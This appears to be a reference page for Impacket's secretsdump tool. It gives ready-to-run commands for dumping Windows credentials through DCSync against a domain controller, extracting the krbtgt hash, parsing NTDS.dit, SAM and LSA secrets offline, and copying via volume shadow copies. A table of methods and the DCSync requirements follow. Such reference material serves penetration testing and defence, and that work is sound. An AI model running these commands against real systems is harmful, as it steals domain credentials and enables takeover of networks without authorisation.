Examples

Remote DCSync — dump all domain hashes from DC

impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator:Pass123@10.10.10.1

DCSync with NTLM hash authentication

impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Dump specific user hash

impacket-secretsdump -just-dc-user krbtgt evilcorp.local/administrator:Pass123@10.10.10.1

Offline NTDS.dit parsing with SYSTEM hive

impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL

Local SAM dump with SYSTEM hive

impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

Full NTDS dump with history and timestamps

impacket-secretsdump -just-dc -history -pwd-last-set -user-status evilcorp.local/administrator:Pass123@10.10.10.1

LSA secrets dump from SECURITY hive

impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL

Use VSS to copy NTDS.dit remotely

impacket-secretsdump -just-dc -use-vss evilcorp.local/administrator:Pass123@10.10.10.1

Documentation

secretsdump — Windows Credential Dumper

secretsdump is the credential dumping powerhouse from the Impacket suite, supporting multiple extraction techniques against Windows systems.

Extraction Methods

Method Command Description
DCSync -just-dc Domain replication, no file access needed
SAM -sam SAM.hive -system SYSTEM.hive Local account hashes
LSA -security SECURITY.hive -system SYSTEM.hive LSA secrets
NTDS -ntds ntds.dit -system SYSTEM.hive Offline NTDS parsing
VSS -use-vss Volume Shadow Copy for remote NTDS

DCSync Requirements

  • Domain Admin privileges (or equivalent rights like Replicating Directory Changes)
  • Network access to the domain controller (port 445)
  • Target domain controller running Windows
